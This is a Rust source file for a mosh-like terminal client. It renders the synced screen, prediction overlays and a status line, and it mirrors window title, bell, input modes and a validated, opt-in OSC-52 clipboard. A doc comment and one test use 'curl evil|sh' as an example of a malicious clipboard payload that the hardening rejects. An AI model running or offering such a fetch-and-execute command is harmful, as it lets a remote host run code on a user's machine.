//! Painting the synchronized `vt100` screen (plus prediction overlays and a status line)
//! onto the local terminal through the pluggable [`KohBackend`] seam.
//!
//! We render cell-by-cell — rather than just blitting `screen.contents_formatted()` — because
//! the predictor needs to draw speculative cells (underlined) *on top of* the authoritative
//! grid. Style changes are diffed against the previous cell so we emit minimal SGR. Each frame
//! is wrapped in synchronized output (DEC mode 2026) so the terminal shows it atomically
//! (no tearing/flicker on full repaints or resizes).
//!
//! Nothing here knows which terminal crate is in use: the engine calls [`KohBackend`] methods
//! (`begin_frame` / `move_to` / `set_style` / `print` / …), whose default implementations emit the
//! same standard ANSI koh always did — so this path no longer depends on `termina` (or any other
//! backend) types.

use std::io;

use super::backend::{CellStyle, KohBackend};
use crate::predict::Overlay;
use crate::terminal::MAXIMUM_CLIPBOARD_SIZE;
use vt100::{Color, Screen};

/// Render the authoritative `screen` with prediction `overlay` and an optional `status` line
/// (drawn reverse-video on the last row) to `backend`, wrapped in one synchronized-output frame.
pub fn render(
    backend: &mut impl KohBackend,
    screen: &Screen,
    overlay: &Overlay,
    status: Option<&str>,
) -> io::Result<()> {
    let (rows, cols) = screen.size();

    // Begin Synchronized Update (atomic frame) and hide the cursor while we paint.
    backend.begin_frame()?;

    let mut cur_style: Option<CellStyle> = None;
    for row in 0..rows {
        backend.move_to(row, 0)?;
        let mut col = 0u16;
        while col < cols {
            let cell = screen.cell(row, col);
            if let Some(c) = cell {
                if c.is_wide_continuation() {
                    col += 1;
                    continue;
                }
            }
            // A prediction wins on glyph/underline for this cell — EXCEPT an "unknown" cell,
            // which only hints: it underlines the real cell rather than overwriting its glyph.
            let pred = overlay.cell(row, col);
            let concrete = pred.filter(|p| !p.unknown); // prediction carrying a real glyph
            let hint_underline = pred.is_some_and(|p| p.unknown && p.underline);

            let style = if let Some(p) = concrete {
                CellStyle {
                    fg: p.fg,
                    bg: p.bg,
                    bold: false,
                    dim: false,
                    italic: false,
                    // mosh flags predictions with underline on high-latency links.
                    underline: p.underline,
                    inverse: false,
                }
            } else if let Some(c) = cell {
                CellStyle {
                    fg: c.fgcolor(),
                    bg: c.bgcolor(),
                    bold: c.bold(),
                    dim: c.dim(),
                    italic: c.italic(),
                    underline: c.underline() || hint_underline,
                    inverse: c.inverse(),
                }
            } else {
                CellStyle {
                    fg: Color::Default,
                    bg: Color::Default,
                    bold: false,
                    dim: false,
                    italic: false,
                    underline: hint_underline,
                    inverse: false,
                }
            };

            if cur_style != Some(style) {
                backend.set_style(style)?;
                cur_style = Some(style);
            }

            // Borrow a &str per branch — no per-cell String allocation on the hot repaint path
            // (S-04): `contents()` already returns &str and the predicted glyph is borrowed from the
            // overlay, both outliving this write. An empty glyph renders as a blank cell.
            let glyph: &str = if let Some(p) = concrete {
                &p.glyph
            } else if let Some(c) = cell.filter(|c| c.has_contents()) {
                c.contents()
            } else {
                " "
            };
            backend.print(if glyph.is_empty() { " " } else { glyph })?;
            col += 1;
        }
    }

    backend.reset_sgr()?;

    if let Some(st) = status {
        let mut line = format!(" {st} ");
        let max = cols as usize;
        if line.len() > max {
            // Truncate on a UTF-8 char boundary, never mid-scalar. `cols` is the peer-controlled
            // (clamped) screen width, and the status strings contain multi-byte glyphs (em-dash,
            // ellipsis), so a raw `String::truncate(max)` would panic and crash the client (KOH-04).
            let mut end = max;
            while end > 0 && !line.is_char_boundary(end) {
                end -= 1;
            }
            line.truncate(end);
        }
        backend.move_to(rows.saturating_sub(1), 0)?;
        backend.set_reverse()?;
        backend.print(&line)?;
        backend.reset_sgr()?;
    }

    // Place and show the cursor: the predicted cursor wins if present, else the real one.
    let (crow, ccol) = overlay.cursor().unwrap_or_else(|| screen.cursor_position());
    backend.move_to(crow, ccol)?;
    if !screen.hide_cursor() {
        backend.show_cursor()?;
    }

    // End Synchronized Update: the terminal now reveals the whole frame at once.
    backend.end_frame()?;
    backend.flush()
}

/// Strip control chars from an OSC string payload so it can't break the sequence we wrap it in.
fn sanitize_osc(t: &str) -> String {
    t.chars().filter(|c| !c.is_control()).collect()
}

/// Whether `s` is a well-formed base64 clipboard payload: non-empty and only the standard base64
/// alphabet (`A–Z a–z 0–9 + / =`). A remote OSC-52 set should be base64; anything else is rejected
/// rather than written verbatim to the user's terminal/clipboard (L-1 hardening).
fn is_base64_payload(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
}

/// The out-of-band window state for one frame.
///
/// What the client mirrors onto the real terminal alongside the cell grid (window title, icon
/// name, clipboard, bell). Sourced from the synced state via
/// [`ClientState::window`](crate::client::ClientState::window).
#[derive(Clone, Copy)]
pub struct WindowState<'a> {
    pub title: &'a str,
    pub icon: &'a str,
    pub clipboard: &'a str,
    pub bell_count: u64,
}

/// The input modes the remote app has set, which the real terminal must mirror (KC-01).
///
/// Application keypad / cursor keys, bracketed paste, and xterm mouse reporting: a
/// state-type-agnostic copy of what `vt100::Screen` tracks. The escape sequences emitted are
/// byte-identical to vt100's `input_mode_formatted` / `input_mode_diff`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub struct InputModes {
    pub application_keypad: bool,
    pub application_cursor: bool,
    pub bracketed_paste: bool,
    pub mouse_mode: vt100::MouseProtocolMode,
    pub mouse_encoding: vt100::MouseProtocolEncoding,
}

impl From<&Screen> for InputModes {
    fn from(s: &Screen) -> Self {
        Self {
            application_keypad: s.application_keypad(),
            application_cursor: s.application_cursor(),
            bracketed_paste: s.bracketed_paste(),
            mouse_mode: s.mouse_protocol_mode(),
            mouse_encoding: s.mouse_protocol_encoding(),
        }
    }
}

impl InputModes {
    /// Escape sequences setting every mode explicitly (the first frame / after a resume).
    pub fn formatted(self) -> Vec<u8> {
        self.write(&mut Vec::new(), None)
    }

    /// Escape sequences taking a terminal at `prev` to these modes (only the changes).
    pub fn diff(self, prev: Self) -> Vec<u8> {
        self.write(&mut Vec::new(), Some(prev))
    }

    fn write(self, buf: &mut Vec<u8>, prev: Option<Self>) -> Vec<u8> {
        use vt100::{MouseProtocolEncoding as Enc, MouseProtocolMode as Mode};
        let changed = |get: fn(&Self) -> bool| prev.is_none_or(|p| get(&p) != get(&self));
        if changed(|m| m.application_keypad) {
            buf.extend_from_slice(if self.application_keypad {
                b"\x1b="
            } else {
                b"\x1b>"
            });
        }
        if changed(|m| m.application_cursor) {
            buf.extend_from_slice(if self.application_cursor {
                b"\x1b[?1h"
            } else {
                b"\x1b[?1l"
            });
        }
        if changed(|m| m.bracketed_paste) {
            buf.extend_from_slice(if self.bracketed_paste {
                b"\x1b[?2004h"
            } else {
                b"\x1b[?2004l"
            });
        }
        let prev_mode = prev.map_or(Mode::None, |p| p.mouse_mode);
        if self.mouse_mode != prev_mode {
            match self.mouse_mode {
                Mode::None => buf.extend_from_slice(match prev_mode {
                    Mode::None => b"",
                    Mode::Press => b"\x1b[?9l",
                    Mode::PressRelease => b"\x1b[?1000l",
                    Mode::ButtonMotion => b"\x1b[?1002l",
                    Mode::AnyMotion => b"\x1b[?1003l",
                }),
                Mode::Press => buf.extend_from_slice(b"\x1b[?9h"),
                Mode::PressRelease => buf.extend_from_slice(b"\x1b[?1000h"),
                Mode::ButtonMotion => buf.extend_from_slice(b"\x1b[?1002h"),
                Mode::AnyMotion => buf.extend_from_slice(b"\x1b[?1003h"),
            }
        }
        let prev_enc = prev.map_or(Enc::Default, |p| p.mouse_encoding);
        if self.mouse_encoding != prev_enc {
            match self.mouse_encoding {
                Enc::Default => buf.extend_from_slice(match prev_enc {
                    Enc::Default => b"",
                    Enc::Utf8 => b"\x1b[?1005l",
                    Enc::Sgr => b"\x1b[?1006l",
                }),
                Enc::Utf8 => buf.extend_from_slice(b"\x1b[?1005h"),
                Enc::Sgr => buf.extend_from_slice(b"\x1b[?1006h"),
            }
        }
        std::mem::take(buf)
    }
}

/// Tracks the *out-of-band* terminal state the client mirrors onto the real terminal — window
/// title / icon (OSC 0/1/2), clipboard (OSC 52), the bell, and the input modes (bracketed-paste /
/// mouse / cursor-key) — so each is re-emitted only when it changes. These ride alongside the cell
/// grid but aren't part of it.
///
/// The ledger is **backend-independent**: it decides *what* to emit and *when* (change detection),
/// then calls [`KohBackend`] methods to emit it — so every backend mirrors the same state, and a
/// suspend/resume ([`invalidate`](Self::invalidate)) re-asserts it identically.
#[derive(Default)]
pub(super) struct OutOfBand {
    /// Prepended to the window title (and to the icon when icon == title) so the OS title bar shows
    /// you're in a koh session — mosh's `[mosh] ` prefix. Empty disables it. Compared cells stay the
    /// *raw* title, so change-detection is unaffected.
    title_prefix: String,
    /// Whether remote OSC-52 clipboard writes are honored. **Default OFF** (L-1): a malicious server
    /// could otherwise silently overwrite the user's system clipboard (e.g. swap a copied command
    /// for `curl evil|sh`). Opt in with `--clipboard`; even then the payload is
    /// validated as strict base64 within the size cap before it's forwarded.
    clipboard_enabled: bool,
    /// Sticky (mosh's `title_initialized`): until the app sets a title/icon we don't touch the
    /// user's terminal title — and once it has, we DO propagate a later reset to empty.
    title_initialized: bool,
    last_title: String,
    last_icon: String,
    last_clipboard: String,
    last_bell: u64,
    /// Previous frame's input modes, to diff against the current frame.
    prev_modes: Option<InputModes>,
}

impl OutOfBand {
    /// An [`OutOfBand`] that prefixes the window title with `title_prefix` (e.g. `"[koh] "`; pass
    /// `""` to disable). All other state starts fresh.
    pub(super) fn with_title_prefix(title_prefix: String) -> Self {
        Self {
            title_prefix,
            ..Self::default()
        }
    }

    /// Enable (or disable) honoring remote OSC-52 clipboard writes (default off). Chainable:
    /// `OutOfBand::with_title_prefix(p).with_clipboard(enabled)`.
    #[must_use]
    pub(super) fn with_clipboard(mut self, enabled: bool) -> Self {
        self.clipboard_enabled = enabled;
        self
    }

    /// Invalidate the tracked out-of-band state so the next [`emit`](Self::emit) re-asserts the
    /// title, clipboard, bell baseline, and input modes from scratch. Used after a suspend/resume
    /// (the terminal left and re-entered raw mode + the alternate screen), where everything the
    /// client had mirrored must be re-emitted. The `title_prefix` is preserved.
    pub(super) fn invalidate(&mut self) {
        let prefix = std::mem::take(&mut self.title_prefix);
        let clipboard_enabled = self.clipboard_enabled;
        *self = Self::with_title_prefix(prefix).with_clipboard(clipboard_enabled);
    }

    /// Emit this frame's title/icon / clipboard / bell / input-mode changes to `backend`, updating
    /// the tracked state. Mirrors mosh's `Display::new_frame` out-of-band emission.
    pub(super) fn emit(
        &mut self,
        backend: &mut impl KohBackend,
        modes: InputModes,
        win: WindowState<'_>,
    ) -> io::Result<()> {
        self.emit_window_title(backend, win.title, win.icon)?;
        // Clipboard (OSC 52): OFF by default (L-1). A remote server must not silently overwrite the
        // user's system clipboard. Only when the user explicitly opted in (`--clipboard`) do we
        // forward it — and only a strict-base64 payload within the size cap
        // (the synced value is already capped client-side; we re-check defensively).
        if self.clipboard_enabled && win.clipboard != self.last_clipboard {
            self.last_clipboard = win.clipboard.to_string();
            if !win.clipboard.is_empty()
                && win.clipboard.len() <= MAXIMUM_CLIPBOARD_SIZE
                && is_base64_payload(win.clipboard)
            {
                backend.set_clipboard(win.clipboard)?;
            }
        }
        // Bell: ring once when the server's bell count climbs (coalesced if several rang).
        if win.bell_count > self.last_bell {
            backend.bell()?;
            self.last_bell = win.bell_count;
        }
        // Input modes: re-assert bracketed-paste / mouse / cursor-key (diff vs the previous frame).
        let mode_bytes = match self.prev_modes {
            Some(prev) => modes.diff(prev),
            None => modes.formatted(),
        };
        if !mode_bytes.is_empty() {
            backend.write_input_modes(&mode_bytes)?;
        }
        self.prev_modes = Some(modes);
        Ok(())
    }

    /// Window title + icon (mosh `Display::new_frame`): a combined `]0;` when icon == title, else
    /// `]1;icon` + `]2;title`. Guarded by the sticky title-initialized flag.
    fn emit_window_title(
        &mut self,
        backend: &mut impl KohBackend,
        title: &str,
        icon: &str,
    ) -> io::Result<()> {
        if self.title_initialized {
            if title == self.last_title && icon == self.last_icon {
                return Ok(());
            }
        } else {
            if title.is_empty() && icon.is_empty() {
                return Ok(()); // nothing set yet — don't blank the user's terminal title
            }
            self.title_initialized = true;
        }
        self.last_title = title.to_string();
        self.last_icon = icon.to_string();
        // Prefix the title (and the icon only when it equals the title, preserving the
        // combined-vs-split branch) — mosh `Framebuffer::prefix_window_title`. The prefix rides on
        // top of the sanitized raw values; change-detection above used the raw (unprefixed) strings.
        let icon_eq_title = icon == title;
        let t = format!("{}{}", self.title_prefix, sanitize_osc(title));
        let ic = if icon_eq_title {
            format!("{}{}", self.title_prefix, sanitize_osc(icon))
        } else {
            sanitize_osc(icon)
        };
        if ic == t {
            backend.set_window_title(&t)
        } else {
            backend.set_window_icon_and_title(&ic, &t)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::client::backend::CaptureBackend;
    use crate::predict::{DisplayPreference, PredictionEngine};

    fn screen_of(bytes: &[u8]) -> Screen {
        let mut p = vt100::Parser::new(24, 80, 0);
        p.process(bytes);
        p.screen().clone()
    }

    /// Render into a capture backend and return the emitted bytes as a lossy string.
    fn render_to_string(screen: &Screen, overlay: &Overlay, status: Option<&str>) -> String {
        let mut backend = CaptureBackend::default();
        render(&mut backend, screen, overlay, status).unwrap();
        String::from_utf8_lossy(&backend.bytes).into_owned()
    }

    #[test]
    fn renders_authoritative_text_with_escapes() {
        let s = render_to_string(&screen_of(b"hi"), &Overlay::empty(), None);
        assert!(s.contains("hi"), "rendered text missing");
        assert!(s.contains('\x1b'), "expected ANSI escape sequences");
    }

    #[test]
    fn render_wraps_frame_in_synchronized_output() {
        let s = render_to_string(&screen_of(b"x"), &Overlay::empty(), None);
        assert!(
            s.contains("\x1b[?2026h"),
            "frame must begin synchronized output"
        );
        assert!(
            s.contains("\x1b[?2026l"),
            "frame must end synchronized output"
        );
    }

    /// Build a `WindowState` for tests.
    fn win<'a>(title: &'a str, icon: &'a str, clipboard: &'a str, bell: u64) -> WindowState<'a> {
        WindowState {
            title,
            icon,
            clipboard,
            bell_count: bell,
        }
    }

    /// Run one `OutOfBand::emit` into a fresh capture backend and return the emitted bytes.
    fn oob_emit(oob: &mut OutOfBand, screen: &Screen, win: WindowState<'_>) -> Vec<u8> {
        let mut backend = CaptureBackend::default();
        oob.emit(&mut backend, InputModes::from(screen), win)
            .unwrap();
        backend.bytes
    }

    #[test]
    fn out_of_band_title_emits_once_and_guards_empty() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");

        // Empty title/icon before the shell sets one: never blank the user's terminal title.
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]"),
            "no OSC for an unset title"
        );

        // A real title (icon == title) is emitted as the combined OSC 0.
        let buf = oob_emit(&mut oob, &scr, win("vim - file.rs", "vim - file.rs", "", 0));
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim - file.rs\x07"));

        // Unchanged → not re-emitted.
        let buf = oob_emit(&mut oob, &scr, win("vim - file.rs", "vim - file.rs", "", 0));
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]0;"));

        // Once initialized, a reset to empty IS propagated (mosh's sticky guard).
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;\x07"));
    }

    #[test]
    fn out_of_band_splits_icon_and_title() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        // Distinct icon name + title → ESC]1;<icon> then ESC]2;<title> (mosh).
        let buf = oob_emit(&mut oob, &scr, win("the title", "the-icon", "", 0));
        let s = String::from_utf8_lossy(&buf);
        assert!(s.contains("\x1b]1;the-icon\x07"), "icon OSC 1, got {s:?}");
        assert!(s.contains("\x1b]2;the title\x07"), "title OSC 2, got {s:?}");
    }

    #[test]
    fn out_of_band_prefixes_title_and_equal_icon() {
        let mut oob = OutOfBand::with_title_prefix("[koh] ".to_string());
        let scr = screen_of(b"");

        // icon == title: the prefix is applied to both, and the combined OSC 0 carries it.
        let buf = oob_emit(&mut oob, &scr, win("vim", "vim", "", 0));
        assert!(
            String::from_utf8_lossy(&buf).contains("\x1b]0;[koh] vim\x07"),
            "combined title is prefixed, got {:?}",
            String::from_utf8_lossy(&buf)
        );

        // icon != title: only the title (OSC 2) is prefixed; the icon (OSC 1) is left untouched,
        // mirroring mosh's prefix_window_title (which preserves equivalence but doesn't prefix a
        // distinct icon name).
        let buf = oob_emit(&mut oob, &scr, win("the title", "the-icon", "", 0));
        let s = String::from_utf8_lossy(&buf);
        assert!(
            s.contains("\x1b]1;the-icon\x07"),
            "distinct icon unprefixed, got {s:?}"
        );
        assert!(
            s.contains("\x1b]2;[koh] the title\x07"),
            "title prefixed, got {s:?}"
        );
    }

    #[test]
    fn out_of_band_default_has_no_title_prefix() {
        // The Default constructor (used by tests and the no-prefix opt-out) adds nothing.
        let mut oob = OutOfBand::default();
        let buf = oob_emit(&mut oob, &screen_of(b""), win("vim", "vim", "", 0));
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim\x07"));
    }

    #[test]
    fn out_of_band_clipboard_off_by_default_emits_nothing() {
        // L-1: a default OutOfBand must NOT forward a server-set clipboard — no OSC 52 reaches the
        // terminal even though the clipboard changed (the user never opted in).
        let mut oob = OutOfBand::default();
        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "aGVsbG8=", 0));
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
            "no OSC-52 without explicit opt-in, got {:?}",
            String::from_utf8_lossy(&buf)
        );
    }

    #[test]
    fn out_of_band_forwards_clipboard_when_opted_in() {
        let mut oob = OutOfBand::default().with_clipboard(true);
        let scr = screen_of(b"");
        let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
        assert!(
            String::from_utf8_lossy(&buf).contains("\x1b]52;c;aGVsbG8=\x07"),
            "clipboard OSC 52 forwarded when opted in"
        );
        // Same clipboard again → not re-emitted.
        let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
    }

    #[test]
    fn out_of_band_rejects_non_base64_clipboard_even_when_opted_in() {
        // Even with the opt-in on, a non-base64 payload (e.g. raw shell injection) is dropped, not
        // written verbatim to the terminal.
        let mut oob = OutOfBand::default().with_clipboard(true);
        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "curl evil|sh", 0));
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
            "a non-base64 clipboard payload is rejected, got {:?}",
            String::from_utf8_lossy(&buf)
        );
    }

    #[test]
    fn out_of_band_rings_bell_on_increase_only() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        // Establish the mode baseline (so later emits don't also carry mode bytes).
        let _ = oob_emit(&mut oob, &scr, win("", "", "", 0));

        // No increase → no bell.
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
        assert!(buf.is_empty(), "no bell when the count is unchanged");

        // Count climbs (possibly by more than one) → exactly one bell.
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 3));
        assert_eq!(buf, b"\x07", "one bell on an increase, even if it jumped");
    }

    #[test]
    fn out_of_band_reasserts_input_modes_on_change() {
        let mut oob = OutOfBand::default();
        // Baseline frame in default modes.
        let _ = oob_emit(&mut oob, &screen_of(b""), win("", "", "", 0));

        // The remote turns on bracketed paste + mouse reporting → re-asserted to the real terminal.
        let modes = screen_of(b"\x1b[?2004h\x1b[?1000h");
        let buf = oob_emit(&mut oob, &modes, win("", "", "", 0));
        let s = String::from_utf8_lossy(&buf);
        assert!(s.contains("2004"), "bracketed-paste re-asserted, got {s:?}");
        assert!(s.contains("1000"), "mouse reporting re-asserted, got {s:?}");
    }

    #[test]
    fn renders_status_line() {
        let s = render_to_string(&screen_of(b""), &Overlay::empty(), Some("link down"));
        assert!(s.contains("link down"));
    }

    #[test]
    fn status_line_truncation_is_panic_free_across_all_widths() {
        // KOH-04: the peer-controlled (clamped) screen width must never make the multi-byte status
        // line panic via a mid-UTF-8 `String::truncate`. Sweep every width in [MIN_DIM, MAX_DIM]
        // with the real link-down banner (em-dash U+2014 + ellipsis U+2026, whose bytes straddle
        // widths 18/19/30/31) and assert render() never panics.
        use crate::terminal::{MAX_DIM, MIN_DIM};
        let status = "[koh] link down — resuming… 5s";
        for cols in MIN_DIM..=MAX_DIM {
            let screen = {
                let mut p = vt100::Parser::new(MIN_DIM, cols, 0);
                p.process(b"x");
                p.screen().clone()
            };
            let mut backend = CaptureBackend::default();
            render(&mut backend, &screen, &Overlay::empty(), Some(status))
                .expect("render must not error or panic at any width");
        }
    }

    #[test]
    fn renders_prediction_overlay_glyph() {
        // A predicted glyph (once the server has confirmed it echoes) must appear in the output.
        // Predictions are epoch-gated and hidden until confirmed, so confirm a first keystroke,
        // then a subsequent typed char becomes visible and should render.
        let mut pe = PredictionEngine::new(DisplayPreference::Always);
        pe.set_local_frame_sent(0);
        let blank = screen_of(b"");
        pe.new_user_byte(0, b'a', &blank); // hidden (epoch 1, unconfirmed)
        let echoed = screen_of(b"a");
        pe.set_local_frame_late_acked(1);
        pe.cull(50, &echoed); // confirms -> confirmed_epoch = 1

        pe.set_local_frame_sent(1);
        pe.new_user_byte(60, b'Z', &echoed); // now visible at (0,1)
        let overlay = pe.overlay(&echoed);
        assert!(
            !overlay.is_empty(),
            "confirmed prediction should be visible"
        );

        let s = render_to_string(&echoed, &overlay, None);
        assert!(s.contains('Z'), "predicted glyph not rendered");
    }

    // --- KC-01: InputModes reproduces vt100's input-mode bytes exactly ---

    #[test]
    fn input_modes_formatted_and_diff_match_vt100_byte_for_byte() {
        let seqs: [&[u8]; 6] = [
            b"",
            b"\x1b[?2004h",
            b"\x1b[?1000h\x1b[?1006h",
            b"\x1b[?1003h\x1b[?1005h\x1b[?1h\x1b=",
            b"\x1b[?1002h\x1b[?2004h",
            b"\x1b[?9h",
        ];
        let screens: Vec<Screen> = seqs.iter().map(|s| screen_of(s)).collect();
        for cur in &screens {
            assert_eq!(
                InputModes::from(cur).formatted(),
                cur.input_mode_formatted(),
                "formatted parity"
            );
            for prev in &screens {
                assert_eq!(
                    InputModes::from(cur).diff(InputModes::from(prev)),
                    cur.input_mode_diff(prev),
                    "diff parity"
                );
            }
        }
    }
}
